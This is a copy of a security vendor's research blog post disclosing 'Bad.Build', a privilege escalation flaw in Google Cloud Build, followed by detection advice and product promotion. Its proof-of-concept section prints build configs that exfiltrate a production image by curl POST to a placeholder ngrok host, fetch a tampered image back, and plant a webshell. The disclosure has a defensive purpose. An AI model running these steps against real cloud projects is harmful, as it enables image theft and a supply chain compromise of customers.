---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-18_badbuild-a-critical-privilege-escalation-design-flaw-in-google-cloud-build-enabl.md
original_filename: 2023-07-18_badbuild-a-critical-privilege-escalation-design-flaw-in-google-cloud-build-enabl.md
title: 'Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build
  Enables a Supply Chain Attack'
category: documents
detected_topics:
- cloud-security
- supply-chain
- command-injection
- access-control
- otp
- automation-abuse
tags:
- imported
- documents
- cloud-security
- supply-chain
- command-injection
- access-control
- otp
- automation-abuse
language: en
raw_sha256: 8fedfb2254eae11fdbc27a2b369527bfeef731ab717811387c7b05de891436f6
text_sha256: 302690826ffcf0041a915e724be5c59ffffcf8e07f72556799ade239f4689e63
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-18_badbuild-a-critical-privilege-escalation-design-flaw-in-google-cloud-build-enabl.md
- Source Type: markdown
- Detected Topics: cloud-security, supply-chain, command-injection, access-control, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `8fedfb2254eae11fdbc27a2b369527bfeef731ab717811387c7b05de891436f6`
- Text SHA256: `302690826ffcf0041a915e724be5c59ffffcf8e07f72556799ade239f4689e63`


## Content

---
title: "Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack"
page_title: "Bad.Build: PE & RCE Vulnerabilities in Google Cloud Build"
url: "https://orca.security/resources/blog/bad-build-google-cloud-build-potential-supply-chain-attack-vulnerability/"
final_url: "https://orca.security/resources/blog/bad-build-google-cloud-build-potential-supply-chain-attack-vulnerability/"
authors: ["Roi Nisimi (@roinisimi)"]
programs: ["Google"]
bugs: ["Cloud", "Privilege escalation"]
publication_date: "2023-07-18"
added_date: "2023-07-24"
source: "pentester.land/writeups.json"
original_index: 921
---

[ Blog Home](https://orca.security/resources/blog/)

  * [ Research Pod ](https://orca.security/resources/category/research-pod/)

![Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack](https://orca.security/wp-content/uploads/2023/07/blog-research-bad-build-alert_Cover.jpg?w=1044)

# Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack

[ ![Avatar of Roi Nisimi](https://orca.security/wp-content/uploads/2023/01/roi-nisimi_avatar.png) Roi Nisimi  ](https://orca.security/resources/author/roi-nisimi/)

Published: Jul 18, 2023 

  * [ __](https://twitter.com/share?text=Bad.Build%3A%20A%20Critical%20Privilege%20Escalation%20Design%20Flaw%20in%20Google%20Cloud%20Build%20Enables%20a%20Supply%20Chain%20Attack&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](mailto:?Subject=Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)

Bad.Build is a critical design flaw discovered by the [Orca Research Pod](https://orca.security/about/orca-research-pod/) in the Google Cloud Build service that enables attackers to escalate privileges and gain unauthorized access to code repositories and images in Artifact Registry. 

The flaw presents a significant supply chain risk since it allows attackers to maliciously tamper with application images, which can then infect users and customers when they install the application. As we have seen with the [SolarWinds](https://www.cisecurity.org/solarwinds) and recent [3CX](https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise) and [MOVEit](https://www.progress.com/security/moveit-transfer-and-moveit-cloud-vulnerability) supply chain attacks, this can have far reaching consequences.

Orca Security immediately reported the findings to the Google Security Team, who investigated the issue and [deployed a partial fix](https://cloud.google.com/build/docs/security-bulletins#gcp-2023-013). However, Google’s fix doesn’t revoke the discovered Privilege Escalation (PE) vector. It only limits it – turning it into a design flaw that still leaves organizations vulnerable to the larger supply chain risk. Hence, it requires security teams to put further measures in place to protect against this risk. In this blog post, we’ll explore the details of how the Bad.Build design flaw can be exploited, and provide recommendations on how organizations can reduce their risk of attacks abusing this flaw.

We would like to thank Google for working closely with Orca and for quickly addressing one of the discovered issues.

[View Threat Briefing](https://www.brighttalk.com/webcast/18490/589293)

## Executive Summary:

  * Orca Security discovered a design flaw in the Google Cloud Build service that enables attackers to perform Privilege Escalation, giving them unauthorized access to code repositories in Google’s Artifact Registry.
  * By abusing this flaw that enables the impersonation of the default Cloud Build service account, an attacker can manipulate images in Google’s Artifact Registry and inject malicious code. Any applications built from the manipulated images are then affected, with potential outcomes including Denial-of-Service (DoS) attacks, data theft, and the spread of malware.
  * Even worse, if the malformed applications are meant to be deployed on customer’s environments (either on-premise or semi-SaaS), the risk crosses from the supplying organization’s environment to their customers’ environments, constituting a supply chain attack, similar to what happened in the [SolarWinds](https://www.csoonline.com/article/3601508/solarwinds-supply-chain-attack-explained-why-organizations-were-not-prepared.html) and [MOVEit](https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-15June2023) incidents.
  * After reporting the findings to the Google Security Team, they [issued a partial fix](https://cloud.google.com/build/docs/security-bulletins#gcp-2023-013) – removing a single permission from the default Cloud Build Service Account. The revoked permission wasn’t related to Artifact Registry, which turns the supply chain risk into a persistent one. 
  * In view of this, it’s important that organizations pay close attention to the behavior of the default Google Cloud Build Service Account to detect any possible malicious behavior. Applying the Principle of Least Privilege and implementing cloud detection and response capabilities to identify anomalies are some of the recommendations for reducing risk.
  * A [Threat Briefing](https://www.brighttalk.com/webcast/18490/589293) detailing how an attacker could launch a supply chain attack through the Google Cloud Build service, as well as recommendations on how to fortify your defenses is available to view at any time.

## What is Google Cloud Build?

[Google Cloud Build](https://cloud.google.com/build) is a managed continuous integration and delivery (CI/CD) service provided by Google Cloud that allows you to automate the process of building, testing and deploying software, across all languages. Cloud Build integrates with other services in the Google Cloud ecosystem, such as Artifact Registry, Google Kubernetes Engine, and App Engine.

## How we discovered the Bad.Build PE Vector

As with any good research, it all starts with some sincere and authentic curiosity. The _`setIamPolicy`_ method is used to set or update a GCP resource [IAM policy](https://cloud.google.com/iam/docs/reference/rest/v1/Policy) – a JSON document that specifies the roles granted to different users and groups. For instance, when you update/grant access to principals on a Project’s IAM tab, the _`setIamPolicy`_ API call is invoked.

We noticed an interesting thing about this API call request. Each time the API call is invoked, the full Project’s permissions are included in the Message Body Request, not just the ones we edited. And this information can be found in the GCP audit logs, under the _`request`_ field.

Below is a screen of the event that will show up in the audit logs when granting access to a principal. As you can see, all the Project’s permissions are listed below in the request under the _`bindings`_ field.

![](https://orca.security/wp-content/uploads/2024/01/image-527.png?w=1200)

What makes this information so lucrative is that it greatly facilitates lateral movement and privilege escalation in the environment. Knowing which GCP account can perform which action, is equal to solving a great piece of the puzzle on how to launch an attack. It would be extremely dangerous if this permission map ended up in the wrong hands. 

Since we now knew that all permissions were being recorded in the audit logs, we realized that we only needed to be able to perform the _`__logging.privateLogEntries.list`_ action, as active projects would have many access changes, and every time access was granted, updated, or deleted, the audit logs would show a complete list of all permissions on the project.

So what roles can list the audit logs? Not many, some are considered admins, but there is one that immediately captures the eye – roles/cloudbuild.builds.builder, which is the default role that is being assigned to the cloud build service account. So as it appears, impersonating the cloud build service account allows us to view all Project’s permissions. And to impersonate it? The only required permission is cloudbuild.builds.create.

roles/billing.admin

roles/cloudbuild.builds.builder

roles/composer.worker

roles/iam.securityAdmin

roles/iam.securityReviewer

roles/logging.admin

roles/logging.privateLogViewer

roles/cloudbuild.serviceAgent

And what predefined roles can do that? More roles – most of them related to developers. It’s important to also note that this permission can be individually assigned to users, groups, and service accounts and is very reasonable in an environment utilizing Cloud Build as the main CI/CD platform.

roles/cloudbuild.builds.builder

roles/cloudbuild.builds.editor

roles/composer.worker

roles/dataflow.admin

roles/dataflow.developer

roles/appengineflex.serviceAgent

roles/cloudbuild.serviceAgent

roles/cloudconfig.serviceAgent

roles/clouddeploy.serviceAgent

roles/cloudfunctions.serviceAgent

roles/datapipelines.serviceAgent

roles/dataprep.serviceAgent

roles/run.serviceAgent

roles/runapps.serviceAgent

roles/serverless.serviceAgent

So the question is now – if the cloudbuild.builds.create is at your disposal, how can you impersonate the Cloud Build Service Account? The answer is as simple as these three lines of code:
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/gcloud'
  
    args: ['logging', 'read', 'timestamp>\"2023-03-10T00:00:00Z\" AND protoPayload.methodName=\"setIamPolicy\"', '--limit=1']

This is a simple [cloud build configuration file](https://cloud.google.com/build/docs/configuring-builds/create-basic-configuration), that will build the public gcloud image on the Cloud Build servers and run the command _`logging read timestamp >2023-03-10T00:00:00Z AND protoPayload.methodName=”setIamPolicy” –limit=1`_ in the context of the Cloud Build Service Account, resulting in this:

![](https://orca.security/wp-content/uploads/2024/01/image-528.png?w=806)

As you can see we’re executing commands with gcloud, using the service account roin-svc we’ve created for this demonstration. roin-svc has the _`Dataflow Developer`_ pre-defined role which contains the cloudbuild.builds.create permission.

![](https://orca.security/wp-content/uploads/2024/01/image-529.png?w=1200)

The Dataflow Developer doesn’t have the _logging.privateLogEntries.list_ permission, so the first API call fails. But using the three lines of code from earlier bypass this permission restriction and allow us to retrieve the setIamPolicy audit log event with all the Project’s bindings. To do that, we created a cloud build event using:
  
  
  gcloud builds submit --no-source --gcs-log-dir=gs://cloudbuild-test-orca

This submits a new build for cloudbuild to process, with the flags indicating that no source should be uploaded with this build, and the google cloud storage that will hold the build logs. The –gcs-log-dir is mandatory and requires a bucket with access to both, roin-svc and the default Cloud Build Service Account – <Project id>@cloudbuild.gserviceaccount.com. To fill this requirement without leaving a suspicious behavioral signature, attackers can manually grant access to these entities on a remote google cloud storage.

After reporting this discovery to the Google Security Team, they decided to revoke the _logging.privateLogEntries.list_ permission from the default Cloud Build service account, stating that the _setIamPolicy_ audit logs containing the full set of permissions “make sense from an audit perspective, but not necessarily from the cloud build service account being able to access it perspective”.

### What else can we do?

Now that we have created a POC for this Privilege Escalation technique, we can repeat this process with different actions that the Cloud Build Service Account is allowed to perform. The full list can be seen below: 

![](https://orca.security/wp-content/uploads/2024/01/image-530.png?w=1200)

_Note: We struck out the logging.privateLogEntries.list action, because after we reported this to Google, they_[ _revoked this permission_](https://cloud.google.com/build/docs/security-bulletins#gcp-2023-013) _for the Cloud Build Service account._

Each of the methods listed above can be utilized by us – providing a broader access to GCP services. With these at our disposal we can acquire _nearly-full access_ to Google Cloud Storage, but more significantly, _gain and manipulate sensitive information_ inside Artifact Repositories.

After achieving a successful Proof of Concept (POC) of this discovery, I searched online for other references of this Privilege Escalation technique and found that the [rhinosecuritylabs](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/) were the first to identify it. But, their solution required a longer, more tedious process of exfiltrating the Cloud Build Storage Account token and using it in conjunction with the GCP API. I followed the rhinosecuritylabs POC and it still works, so I would like to use this opportunity to credit them for being the first to identify this technique.

## The Supply Chain Attack Proof of Concept

Note that the scenario we present here takes common use cases that Google discusses in their [Intro to Artifact Registry](https://www.youtube.com/watch?v=712Y0KpeHok), to ensure we’re presenting real issues in real customer environments. 

### Overview

The diagram below shows the five steps an attacker can follow to create the supply chain attack:

![](https://orca.security/wp-content/uploads/2024/01/image-531.png)

_Kill chain of the Bad.Build vulnerability discovered by Orca Security_

  * **Step 1: Privilege Escalation using cloudbuild.builds.create** : cloudbuild.builds.create is a permission which allows accounts to create new builds using the Google Cloud Build service – a fully-managed CI/CD platform that allows you to build, test and deploy software quickly. All build actions, or steps (GCP terminology) are executed by the default [**Cloud Build Service Account**.](https://cloud.google.com/build/docs/cloud-build-service-account)
  * **Step 2: Gaining access to Artifact Registry** : Once an attacker obtains the ability to create builds, they can impersonate the Cloud Build Service Account and escalate privileges. This service account, by default, can run API calls against the [artifact registry](https://cloud.google.com/artifact-registry).
  * **Step 3: Image exfiltration** : Through **_artifactregistry_** permissions the attacker can download and exfiltrate an image that is being used inside Google Kubernetes Engine (GKE).
  * **Step 4: Infecting the image and pushing to Artifact Registry** : The attacker can then inject malicious code into the image and push it back to the artifact registry, which is then deployed once again to the GKE.
  * **Step 5:****__****Supply Chain Attack and Remote Code Execution** : Once the malicious image is deployed, the attacker can exploit it and run code on the docker container as root. 

[View Threat Briefing](https://www.brighttalk.com/webcast/18490/589293)

### Technical Analysis

#### Step 1 – Privilege Escalation using cloudbuild.builds.create

Since we already covered step 1 previously when demonstrating how we discovered the Bad.Build PE Vector, we will continue this supply chain attack scenario from step 2.

#### Step 2 – Accessing the artifact registry

As we have seen earlier, the Cloud Build Service Account role contains many permissions under the _artifactregistry_ service. Our end goal is to find and manipulate sensitive data, so let’s start by listing all the artifact repositories. Again, this can be easily accomplished by sending cloudbuild the request to build the _gcloud_ builtin image and run a native command:
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/gcloud'
  
    args: ['artifacts', 'repositories', 'list']

In our example, this results in 3 different repositories:

![](https://orca.security/wp-content/uploads/2024/01/image-532.png)

The first two are automatically created when deploying Cloud Run and Cloud Functions serverless code, as can be inferred from the description. The last one is self-made with the description implying that it is being used for GKE deployments of the Production environment. We will focus on this last repository, _orcapipe_.

We can see that the format of this repository is DOCKER, so let’s try to list docker images from this repository and see what happens. Region and Project id are being masked. 
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/gcloud'
  
    args: ['artifacts', 'docker', 'images', 'list',
    '<region>-docker.pkg.dev/<project-id>/orcapipe']

![](https://orca.security/wp-content/uploads/2024/01/image-533.png?w=1200)

And here we go. We can see plenty of images, but all have the same name, _pipe-image_ , which probably implies that these are different versions of the same image. Let’s try to see if there are tags for images in this repository.
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/gcloud'
  
    args: ['artifacts', 'docker', 'tags', 'list',
    '<region>-docker.pkg.dev/<project-id>/orcapipe']

![](https://orca.security/wp-content/uploads/2024/01/image-534.png?w=1200)

And yes, there are. We would like to focus on the _most recent_ image, as it represents the final and up-to-date version of the production environment.

#### Step 3 – Image exfiltration

How can we now move this image to our attacker’s machine? There is no straightforward API request for this. But through testing we discover that each step is chronologically executed on the same cloud build server. This knowledge, combined with some creativity, provides the inspiration for our 3-step image exfiltration build:
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/docker'
  
    args: ['pull', '<region>-docker.pkg.dev/<project-id>/orcapipe/pipe-image:latest']
  
  - name: 'gcr.io/cloud-builders/docker'
  
    args: ['save', '<region>-docker.pkg.dev/<project-id>/orcapipe/pipe-image:latest', '-o', 'image.tar']
  
  - name: 'gcr.io/cloud-builders/curl'
  
    args: ['-X', 'POST', '-H', 'filename:image.tar', '--data-binary', '@image.tar', '<ngrok-http>']

This will pull the _pipe-image_ from _orca-pipe_ , save it to an archive image named _image.tar_ and exfiltrate it with the public _curl_ image using a POST request to a remote server.

#### Step 4 – Supply Chain Attack

This _pipe-image_ from the _orca-pipe_ production repository is obviously sensitive. It can be used internally by the organization, but could also be the organization’s main product being delivered to tens, hundreds, or thousands of customers.

In our example, we use the _docker load_ command to load the archived image, which can then be seen with the _docker images_ command.

![](https://orca.security/wp-content/uploads/2024/01/image-535.png?w=1200)

To manipulate and edit this image, we will create a container based on that image using the following command:
  
  
  docker run -v /tmp:/tmp -it 
  <region>-docker.pkg.dev/<project-id>/orca-pipe/pipe-image:latest /bin/sh

![](https://orca.security/wp-content/uploads/2024/01/image-536.png?w=1200)

Listing the current directory reveals our binary and source code. We then copy the _helloworld.go_ source code to our mounted /tmp directory, so we can open it using a text editor:

![](https://orca.security/wp-content/uploads/2024/01/image-537.png?w=883)

For our demonstration, we used this simple code which uses the _net/http_ Go package in order to listen to all interfaces on port 8081 and print Hello World when a request is being made.

To install malware that we can then use to exploit all occurrences of this application, we will add a few lines of code that will serve as a webshell, looking for the _`test`_ GET param and execute it using sh.

![](https://orca.security/wp-content/uploads/2024/01/image-538.png)

We will copy this back to our container, overriding the original _`helloworld.go`_ file and compiling it using Go. Then follow with a _docker commit_ command that will save our container changes to a new image.

![](https://orca.security/wp-content/uploads/2024/01/image-539.png?w=1200) ![](https://orca.security/wp-content/uploads/2024/01/image-540.png?w=1200)

And we have our malicious image ready to be pushed back to the artifact registry. To do that, we will first use _docker save_ to create a new image archive named _image.tar_ and host it with HTTP. Then we will only need to execute these three simple steps in cloudbuild:
  
  
  steps:
  
  - name: 'gcr.io/cloud-builders/wget'
  
    args: ['<ngrok-http>/image.tar']
  
  - name: 'gcr.io/cloud-builders/docker'
  
    args: ['load', '--input', 'image.tar']
  
  - name: 'gcr.io/cloud-builders/docker'
  
    args: ['push', '<region>-docker.pkg.dev/<project-id>/orcapipe/pipe-image']

And that’s it! We’ve got a new malware-injected image in the production artifact repository. From the moment we acquired the cloudbuild.builds.create permission, it took us around 5 minutes to come full circle to an extremely severe supply chain attack, with the use of native tools only. Of course this is only a POC, and our edited code is far from production-like code, but this process illustrates how easy it can get.

#### Step 5 – Exploitation

With this K8s deployment example GKE will fetch our new malicious image version and deploy it automatically. This, followed by the creation of a K8s LoadBalancer, will make this container public-facing and accessible on port 8081, so we can exploit it and execute remote code.

![](https://orca.security/wp-content/uploads/2024/01/image-541.png) ![](https://orca.security/wp-content/uploads/2024/01/image-542.png)

## Attack Summary

Looking at the GCP audit logs, there doesn’t seem to be a straightforward way to identify illegitimate use of CloudBuild. The events that should be examined are the following:

  1. _`google.devtools.cloudbuild.v1.CloudBuild.CreateBuild`_
  2. API calls issued by the default Cloud Build Service Account

Taking a closer look at what happened behind the scenes when we abused CloudBuild to list audit log entries (something we can no longer do by default after [Google’s fix](https://cloud.google.com/build/docs/security-bulletins#gcp-2023-013)), we could first identify this _CreateBuild_ event issued by _roin-svc_ :

![](https://orca.security/wp-content/uploads/2024/01/image-543.png?w=1200)

This simply implies that the _roin-svc_ service account initiated a new CloudBuild build, with the destination log bucket being _gs://cloudbuild-test-orca_. To determine whether this could indicate possible malicious behavior, we should pose the following two questions: 

1) Should roin-svc be creating Cloud Builds? 

2) Is the _cloudbuild-test-orca_ bucket part of my organization? 

If the answer to any of these questions is No, this should raise a red flag.

The second event we can observe is the _`google.logging.v2.LoggingServiceV2.ListLogEntries`_ issued by the default Cloud Build Service Account.

![](https://orca.security/wp-content/uploads/2024/01/image-544.png?w=1200)

This implies that the _< project-id>@cloudbuild.gserviceaccount.com_ listed the audit log entries. Also, looking at the _filter_ field under _request_ can help us understand exactly which command this _cloudbuild_ executed. But, how can we be sure this is not legitimate? Maybe we have applications that need this information.

To solve this problem, we must acquire context. If this or any other single event immediately raises suspicion then that’s great, but that will not always be the case. In order to detect these abuse attempts more broadly, effectively, and automatically – An [anomaly detection engine](https://orca.security/resources/blog/cloud-anomaly-detection-with-ai/) can be the only way, as discussed further in the recommendations section below. 

### Who is affected by this and what is the potential impact?

The potential impact can be diverse, and applies to all organizations that are using the Artifact Registry as their main or secondary image repository. 

The first and immediate impact is disrupting the applications relying on these images. This can lead to DOS, data theft and spreading malware to users.

If the organization’s applications are deployed on-premise, or semi-Saas (installing software on the customer’s cloud environment), the risk boundaries cross the organization’s environment to the customers’ cloud/on-premise environments, in a similar way as happened in the SolarWinds incident.

## Recommendations

The Google Security Team informed us that they were going to keep the default permissions of the Google Cloud Build service account the same (except for the _logging.privateLogEntries.list_ permission), mentioning that it supports the most common development workflows, and emphasized that customers are responsible for locking down access for more advanced scenarios.

It’s therefore important that organizations pay close attention to the behavior of the default Google Cloud Build service account. Applying the Principle of Least Privilege and implementing cloud detection and response capabilities to identify anomalies are some of the recommendations for reducing risk:

### 1\. As always, adhere to least privilege

Now that we know that the cloudbuild.builds.create permission grants all the permissions of the Cloud Build Service Account, it’s important for security teams to be very aware of which accounts are entitled to this. If one is compromised, the consequences can be immense. 

The [Orca Cloud Security Platform](https://orca.security/platform/) provides complete visibility into which users are capable of exploiting overprivileged, dormant, or unused roles to escalate privileges. Orca offers comprehensive [cloud infrastructure entitlement management (CIEM) capabilities](https://orca.security/platform/cloud-infrastructure-entitlement-management-ciem/) and helps organizations detect identity misconfigurations, ensure least-privilege compliance, and monitor identity hygiene metrics. This includes identifying over-privileged identities with a high percentage of unused access and powerful infrastructure permissions. 

We also recommend adjusting and modifying the default permissions granted to the Cloud Build Service Account for your specific needs. Anything that is beyond what you really need for your organizational operations, opens a door for a potential attacker. In general, it’s recommended to continuously [assess entitlement credentials](https://orca.security/platform/cloud-infrastructure-entitlement-management-ciem/) and remove those that contradict the Principle of Least Privilege (PoLP).

![](https://orca.security/wp-content/uploads/2024/01/image-545.png?w=1200)

_An alert in the Orca Security platform identifying a GCP IAM service account’s policies that might lead to privilege escalation_

### 2\. Prioritize risks that endanger your critical business assets

It’s also important to have an automated way of prioritizing the risks that threaten your organization’s critical cloud resources. That includes going beyond individual IAM risks, and being able to leverage wider cloud context and other connected risks —vulnerabilities, misconfigurations, malware, the location of sensitive data, and lateral movement risk—to help you prioritize the risks in your environment in a holistic way. 

By applying [Attack Path Analysis](https://orca.security/resources/blog/multi-cloud-attack-path-analysis-for-strategic-remediation/), Orca warns how individual identity risks can be combined with other risks to create dangerous attack paths exposing sensitive data and other critical assets. This empowers security teams to focus on remediating the risks that pose the greatest danger to the organization’s sensitive data, reducing alert fatigue and preventing potentially damaging data breaches.

![](https://orca.security/wp-content/uploads/2024/01/image-546.png?w=1200)

_This attack path, which includes a highly privileged GCP IAM service account, scores 99 out of 100 and is considered critical._

### 3\. Use Cloud Detection & Response to detect dangerous anomalies

Anomaly detection also plays an important part in reducing the risk of this type of supply chain attack. The Orca Platform alerts to suspicious activities by continuously collecting and analyzing intelligence from cloud feeds, workloads, and configurations, so organizations can be one step ahead of the most sophisticated attackers. 

  
In the case of this Cloud Build supply chain risk, Orca can [detect anomalies](https://orca.security/resources/blog/cloud-anomaly-detection-with-ai) related to the abnormal usage of the cloudbuild.builds.create permission. When the Orca platform detects a deviation that raises concerns, it sends out an alert. Factors including severity, past behaviors, relationship to other anomalies and cloud risks, are all taken into account. Ultimately, the alert is shown to the user in a clear and concise format, allowing for fast comprehension and facilitating an appropriate and timely response.

![](https://orca.security/wp-content/uploads/2024/01/image-547.png?w=868)

_Orca alerts to an anomaly of excessive usage in the Google Cloud Build service account_

## About Orca Security

Orca’s agentless [Cloud Security Platform ](https://orca.security/platform/)connects to your environment in minutes and provides 100% visibility into all your assets on AWS, Azure, Google Cloud, Alibaba Cloud, Oracle Cloud, and Kubernetes, automatically including new assets as they are added. Orca detects and prioritizes cloud risks across every layer of your cloud estate, including vulnerabilities, malware, misconfigurations, lateral movement risk, API risks, weak and leaked passwords, sensitive data at risk, and overly permissive identities.

To learn more about this supply chain risk and how to protect against it, view our [Threat Briefing](https://www.brighttalk.com/webcast/18490/589293) where we show how we discovered the Bad.Build vulnerability and provide recommendations to further fortify your defenses.

  * [ __](https://twitter.com/share?text=Bad.Build%3A%20A%20Critical%20Privilege%20Escalation%20Design%20Flaw%20in%20Google%20Cloud%20Build%20Enables%20a%20Supply%20Chain%20Attack&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)
  * [ __](mailto:?Subject=Bad.Build: A Critical Privilege Escalation Design Flaw in Google Cloud Build Enables a Supply Chain Attack&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fbad-build-google-cloud-build-potential-supply-chain-attack-vulnerability%2F)

## Related articles

[ ![Risk-based Vulnerability Management](https://orca.security/wp-content/uploads/2025/02/orca-blog-risk-prioritization-featured.png?w=750) ](/resources/blog/risk-based-vulnerability-management/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Product Info

##  [Risk-Based Vulnerability Management for the Cloud: A 2026 Guide](/resources/blog/risk-based-vulnerability-management/ "Risk-Based Vulnerability Management for the Cloud: A 2026 Guide")

Jun 26, 2026 

[ ![Digital illustration of a data center cross-section showing an adversarial path indicated by glowing red arrows originating from a breached, orange-lit server rack and moving laterally toward a secured, cyan-lit server enclosure with a locked terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-private-cloud-security-1.png?w=750) ](/resources/blog/private-cloud-security/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [Private Cloud Security: Top Risks and Best Practices (2026)](/resources/blog/private-cloud-security/ "Private Cloud Security: Top Risks and Best Practices \(2026\)")

Jun 26, 2026 

[ ![Digital illustration of a central AI microchip on a cloudy background, processing threats from the left—such as a cracked message bubble and a bug icon—and outputting cybersecurity solutions on the right, including prioritized alert windows and a remediation code terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-what-is-generative-ai-in-cybersecurity-1.png?w=750) ](/resources/blog/what-is-generative-ai-in-cybersecurity/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [What Is Generative AI in Cybersecurity?](/resources/blog/what-is-generative-ai-in-cybersecurity/ "What Is Generative AI in Cybersecurity?")

Jun 25, 2026 

### Stay in the loop

Keep up to date with everything you need to know about cloud security and our latest research

By submitting my email address I agree to the use of my personal data in accordance with Orca Security [ Privacy Policy](https://orca.security/privacy-policy/).
